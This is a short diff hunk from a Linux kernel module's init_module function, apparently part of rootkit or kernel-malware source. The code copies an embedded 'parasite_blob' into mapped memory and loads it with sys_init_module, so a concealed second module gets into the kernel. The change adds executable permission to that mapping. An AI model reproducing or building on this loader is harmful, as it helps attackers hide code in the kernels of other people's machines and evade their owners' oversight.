@@ -65,7 +65,7 @@ int init_module(void)
 
 	if (sys_init_module) {
 		const size_t len = roundup(sizeof(parasite_blob), PAGE_SIZE);
-		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0);
+		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0);
 		if (map) {
 			copy_to_user(map, parasite_blob, sizeof(parasite_blob));
 			sys_init_module(map, sizeof(parasite_blob), map + sizeof(parasite_blob));
